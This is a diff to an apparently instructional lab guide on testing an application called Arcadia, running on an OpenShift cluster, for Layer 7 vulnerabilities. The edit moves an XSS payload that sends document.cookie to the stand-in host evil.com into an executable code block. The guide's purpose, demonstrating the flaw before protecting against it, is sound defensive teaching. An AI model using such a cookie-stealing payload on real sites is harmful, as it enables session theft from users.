@@ -54,8 +54,7 @@ following command in our terminal window:
 oc get svc
 ----
 
-This will show us the services running in our Kubernetes cluster,
-including those related to the Arcadia application.
+This will show us the services running in our cluster, including those related to the Arcadia application.
 
 [source,texinfo,subs="attributes"]
 ----
@@ -187,17 +186,18 @@ need to check if it's currently vulnerable to Layer 7 attacks. We can do
 this by executing a simple XSS attack, which is a well-known OWASP top
 10 attack.
 
-To perform the XSS attack, we can launch the Firefox browser and append
-`?a=<script>` to the end of the application URL. If the request is
-allowed, then our application is vulnerable to XSS attacks.
+To perform the XSS attack, we can launch our browser and append `?a=<script>` to the end of the application URL. +
+If the request is allowed, then our application is vulnerable to XSS attacks.
 
 image:image11.png[image]
 
-We can further test this by appending
-`?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`
-to the application URL, which will attempt to steal our document cookie.
-If this request is also allowed, then a bad actor could potentially
-steal sensitive information from our application user.
+We can further test this by appending the following to the application URL, which will attempt to steal our document cookie.
+If this request is  allowed, then a bad actor could potentially steal sensitive information from our application user. +
+
+[source,sh,role=execute]
+----
+?item='><script>document.location='http://evil.com/steal'+document.cookie</script>
+----
 
 image:image12.png[image]
 
